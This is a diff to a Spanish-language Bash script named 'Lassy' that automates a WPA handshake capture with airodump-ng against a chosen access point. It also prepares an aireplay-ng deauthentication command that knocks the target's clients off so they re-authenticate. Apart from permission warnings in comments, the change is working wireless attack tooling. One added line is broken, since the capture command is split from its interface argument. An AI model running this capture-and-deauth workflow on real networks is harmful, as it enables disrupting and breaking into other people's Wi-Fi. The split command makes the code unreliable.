@@ -139,7 +139,7 @@ sleep 1
 DESKTOP_DIR="$HOME/Escritorio"
 if [ ! -d "$DESKTOP_DIR" ]; then DESKTOP_DIR="$HOME/Desktop"; fi
 
-read -p "$(echo -e ${CYAN}Escribe el número identificador para la carpeta (ej: 90): ${RESET})" idnum
+read -p "${CYAN}Escribe el número identificador para la carpeta (ej: 90): ${RESET}" idnum
 if ! [[ "$idnum" =~ ^[0-9]+$ ]]; then echo -e "${RED}Número inválido.${RESET}"; exit 1; fi
 
 PROJECT_DIR="$DESKTOP_DIR/Lassy-$idnum"
@@ -152,3 +152,45 @@ cd "$PROJECT_DIR" || exit 1
 # Lanzar airodump específico para capturar handshake (salida handshake-01.cap)
 echo -e "${CYAN}Iniciando captura dirigida (airodump-ng) en canal ${channel} para BSSID ${bssid_input}...${RESET}"
 sudo airodump-ng -c "$channel" --bssid "$bssid_input" -w handshake 
+"$monitor_iface" &
+CAP_PID=$!
+
+echo -e "${YELLOW}Airodump-ng de captura ejecutándose en background (PID: $CAP_PID).${RESET}"
+echo -e "${YELLOW}Fichero de captura: ${RESET}${GREEN}$PROJECT_DIR/handshake-01.cap${RESET}"
+echo ""
+
+# Abrir una nueva terminal para que EJECUTES MANUALMENTE el aireplay (si y solo si tienes permiso).
+# Aquí no lo ejecutamos automáticamente. Se abrirá la terminal con la línea preparada.
+TERM_CMD="echo 'ATENCIÓN: SOLO EJECUTA ESTO SI TIENES PERMISO. Ejecuta manualmente para provocar re-autenticación (deauth) en el cliente objetivo.' ; echo '' ; echo 'Ejemplo comando (no automatizado):' ; echo \"sudo aireplay-ng -0 10 -a $bssid_input $monitor_iface\" ; bash"
+
+# Intentamos abrir gnome-terminal, xfce4-terminal, xterm, o alternativa
+if command -v gnome-terminal >/dev/null 2>&1; then
+  gnome-terminal -- bash -lc "$TERM_CMD" >/dev/null 2>&1 &
+elif command -v xfce4-terminal >/dev/null 2>&1; then
+  xfce4-terminal --command="bash -lc \"$TERM_CMD\"" >/dev/null 2>&1 &
+elif command -v xterm >/dev/null 2>&1; then
+  xterm -e bash -lc "$TERM_CMD" >/dev/null 2>&1 &
+else
+  echo -e "${YELLOW}No pude abrir una terminal nueva automáticamente. Aquí tienes el comando de ejemplo:${RESET}"
+  echo -e "${CYAN}sudo aireplay-ng -0 10 -a ${bssid_input} ${monitor_iface}${RESET}"
+fi
+
+echo -e "${MAGENTA}Cuando obtengas el handshake (o quieras parar), vuelve aquí y presiona ENTER para terminar la captura.${RESET}"
+read -p "" dummy
+
+# Al finalizar, matamos la captura
+kill $CAP_PID 2>/dev/null || true
+sleep 1
+
+# Mostrar archivo .cap (si existe)
+capfile="$PROJECT_DIR/handshake-01.cap"
+if [ -f "$capfile" ]; then
+  echo -e "${GREEN}Archivo de captura creado:${RESET} ${YELLOW}$capfile${RESET}"
+  echo -e "${GREEN}Eso es todo amigo. ¡Buen trabajo con Lassy!${RESET}"
+else
+  echo -e "${YELLOW}No se encontró handshake-01.cap. Puede que no se haya capturado un handshake.${RESET}"
+  echo -e "${GREEN}Eso es todo amigo. Revisa los logs en $PROJECT_DIR${RESET}"
+fi
+
+# FIN
+exit 0
